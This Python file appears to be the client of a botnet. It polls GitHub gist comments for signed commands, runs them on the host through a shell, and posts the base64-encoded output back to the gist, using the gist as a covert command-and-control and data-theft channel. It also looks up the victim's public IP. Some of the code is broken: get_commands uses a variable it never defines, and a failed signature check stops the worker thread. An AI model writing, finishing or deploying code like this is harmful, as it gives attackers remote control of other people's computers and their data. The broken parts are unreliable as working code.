import base64
import subprocess
import threading
import random
import requests
from queue import Empty
from queue import Queue

from nacl.exceptions import BadSignatureError

from connection import Connection
from time import sleep
from nacl.signing import VerifyKey

class Bot:
    def __init__(self, token: str, gistID: str, verify_key: str):

        self.shared = Connection(token, gistID)
        self.unprocessed_commands = Queue()
        self.active = True
        self.worker_thread = None
        self.ip = (requests.get("https://am.i.mullvad.net/ip").content.decode("utf-8").strip())

        self.verify_key = VerifyKey(base64.b64decode(verify_key.encode("utf-8")))

        self.wait_for_commands()

    def wait_for_commands(self):

        self.worker_thread = threading.Thread(target=self.process_commands, daemon=True)

        self.worker_thread.start()

        while self.active:
            for command in self.shared.check_comments():
                self.unprocessed_commands.put(command)
            
            sleep(random.uniform(3,8))
        
        self.worker_thread.join()

    def process_commands(self):

        while self.active:
            try:
                current_command = self.unprocessed_commands.get(timeout=5)
            except Empty:
                continue

            response_id = f"[]({base64.b64encode(f'{current_command.id}-{self.ip}'.encode('utf-8')).decode('utf-8')})"
            ip_b64 = base64.b64encode(self.ip.encode("utf-8")).decode("utf-8")

            if not self.verify_signature(current_command.body):
                return

            if Connection.REQ_PING in current_command.body:
                self.shared.send_msg(f"{Connection.RES_PING} {response_id}")

            elif Connection.REQ_SHUT_OFF in current_command.body:
                self.shared.send_msg(f"{Connection.RES_SHUT_OFF} {response_id}")
                self.active = False

            elif Connection.REQ_USERS in current_command.body:
               self.execute_command("w", Connection.RES_USERS, response_id)

            elif Connection.REQ_CONTENT in current_command.body:
                self.get_commands(current_command)

            elif Connection.REQ_ID in current_command.body:
                self.get_commands(current_command)

            elif Connection.REQ_BINARY in current_command.body:
                self.get_commands(current_command)
            
            elif Connection.REQ_COPY in current_command.body:
                self.get_commands(current_command)

            elif Connection.REQ_READ in current_command.body:
                self.get_commands(current_command)

            else:
                return
            
            self.unprocessed_commands.task_done()
    
    def get_commands(self, current_command):
        command = (
            base64.b64decode(
                current_command.body.split("<")[1].split(">")[0]
            ).decode("utf-8")
            if "<" in current_command.body and ">" in current_command.body
            else None
        )
        self.execute_command(command, Connection.RES_READ, response_id)
    
    def execute_command(self, cmd: str, response_header: str, response_id: str):

        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            print(output)
        except subprocess.CalledProcessError as err:
            output = err.output

        self.shared.send_msg(
            f"{response_header} "
            f"[]({base64.b64encode(output).decode('utf-8')}) "
            f"{response_id}")


    def verify_signature(self, command: str) -> bool:
   
        signature_split = command.split("_")

        if len(signature_split) != 3:
            return False

        command = signature_split[0][:-4].encode("utf-8")
        signature = base64.b64decode(signature_split[1].encode("utf-8"))

        try:
            self.verify_key.verify(command, signature)
        except BadSignatureError:
            return False

        return True

def main():
    bot = Bot(
        "", #Github Personal Access Token
        "", #ID of the gist used
        ""  #32b key from the controller
    )

if __name__ == "__main__":
    main()